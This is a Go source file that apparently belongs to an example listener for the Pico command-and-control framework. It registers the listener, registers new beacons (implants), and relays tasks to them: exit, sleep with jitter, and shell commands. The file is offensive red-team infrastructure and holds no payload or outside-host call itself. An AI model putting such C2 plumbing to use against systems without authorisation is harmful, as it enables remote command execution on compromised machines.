package server

import (
	"example_listener/internal/config"
	"log"
	"net"
	"strconv"

	listener "github.com/PicoTools/pico-shared/proto/gen/listener/v1"
	"github.com/PicoTools/pico-shared/shared"
	"google.golang.org/protobuf/types/known/wrapperspb"
)

func (s *Server) RegisterListener() error {
	host, portStr, err := net.SplitHostPort(config.ListenerAddr)
	if err != nil {
		return err
	}

	port, err := strconv.ParseUint(portStr, 10, 32)
	if err != nil {
		return err
	}

	_, err = s.svc.UpdateListener(s.ctx, &listener.UpdateListenerRequest{
		Name: wrapperspb.String(config.ListenerName),
		Ip:   wrapperspb.String(host),
		Port: wrapperspb.UInt32(uint32(port)),
	})
	if err != nil {
		return err
	}
	log.Printf("Listener registered [Name: %s, IP: %s, Port: %d]", config.ListenerName, host, port)

	return nil
}

func (s *Server) NewBeacon(newBeacon *listener.RegisterAgentRequest) error {
	_, err := s.svc.RegisterAgent(s.ctx, newBeacon)
	if err != nil {
		return err
	}

	return nil
}

type Task struct {
	Id   int      `json:"id"`
	Cap  int      `json:"cap"`
	Args []string `json:"args"`
}

func (s *Server) GetTask(beaconId uint32) (*Task, error) {
	res, err := s.svc.GetTask(s.ctx, &listener.GetTaskRequest{
		Id: beaconId,
	})
	if err != nil {
		return nil, err
	}

	if res.GetBody() == nil {
		return nil, nil
	}

	switch res.GetCap() {
	case uint32(shared.CapExit):
		return &Task{
			Id:   int(res.GetId()),
			Cap:  int(res.GetCap()),
			Args: []string{},
		}, nil
	case uint32(shared.CapSleep):
		v := res.GetSleep()
		sleep := strconv.Itoa(int(v.GetSleep()))
		jitter := strconv.Itoa(int(v.GetJitter()))
		return &Task{
			Id:   int(res.GetId()),
			Cap:  int(res.GetCap()),
			Args: []string{sleep, jitter},
		}, nil
	case uint32(shared.CapShell):
		v := res.GetShell()
		cmd := v.GetCmd()
		return &Task{
			Id:   int(res.GetId()),
			Cap:  int(res.GetCap()),
			Args: []string{cmd},
		}, nil
	default:
		return nil, nil
	}
}
